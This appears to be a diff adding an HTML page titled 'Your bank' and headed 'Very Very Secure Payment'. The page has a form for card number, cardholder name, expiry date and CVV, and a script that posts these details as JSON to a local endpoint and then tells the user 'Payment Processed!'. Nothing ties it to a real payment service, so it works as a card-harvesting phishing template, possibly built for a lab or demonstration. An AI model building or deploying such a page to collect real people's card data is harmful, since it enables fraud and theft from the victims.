@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Your bank</title>
+   <style>
+
+       body {
+           font-family: Arial, sans-serif;
+           background-color: #f4f4f4;
+           display: flex;
+           justify-content: center;
+           align-items: center;
+           height: 100vh;
+           margin: 0;
+       }
+       .container {
+           background-color: white;
+           padding: 20px;
+           border-radius: 5px;
+           box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+           text-align: center;
+           width: 350px;
+       }
+       h2 {
+           margin-bottom: 20px;
+       }
+       .input-field {
+           width: 100%;
+           padding: 10px;
+           margin: 10px 0;
+           border: 1px solid #ccc;
+           border-radius: 5px;
+           box-sizing: border-box;
+       }
+       .submit-btn {
+           width: 100%;
+           padding: 10px;
+           background-color: #28a745;
+           color: white;
+           border: none;
+           border-radius: 5px;
+           cursor: pointer;
+           font-size: 16px;
+       }
+       .submit-btn:hover {
+           background-color: #218838;
+       }
+       
+   </style>
+</head>
+<body>
+
+<div class="container">
+   <h2>Very Very Secure Payment</h2>
+   <form id="cardForm">
+       <input type="text" class="input-field" name="cardNumber" id="cardNumber" placeholder="Card Number" required>
+       <input type="text" class="input-field" name="cardHolder" id="cardHolder" placeholder="Cardholder Name" required>
+       <input type="text" class="input-field" name="expiryDate" id="expiryDate" placeholder="Expiry Date (MM/YY)" required>
+       <input type="text" class="input-field" name="cvv" id="cvv" placeholder="CVV" required>
+       <button type="submit" class="submit-btn">Submit</button>
+   </form>
+</div>
+
+<script>
+   document.getElementById("cardForm").addEventListener("submit", function(event) {
+       event.preventDefault();
+
+       const cardNumber = document.getElementById("cardNumber").value;
+       const cardHolder = document.getElementById("cardHolder").value;
+       const expiryDate = document.getElementById("expiryDate").value;
+       const cvv = document.getElementById("cvv").value;
+
+       const data = {
+           cardNumber: cardNumber,
+           cardHolder: cardHolder,
+           expiryDate: expiryDate,
+           cvv: cvv
+       };
+
+       fetch('http://localhost:8000/card_submit', {
+           method: 'POST',
+           headers: { 'Content-Type': 'application/json' },
+           body: JSON.stringify(data),
+       })
+       .then(response => response.json())
+       .then(data => {
+           console.log('Success:', data);
+           alert('Payment Processed!');
+       })
+       .catch(error => {
+           console.error('Error:', error);
+           alert('Payment Failed, try again later');
+       });
+   });
+</script>
+
+</body>
+</html>
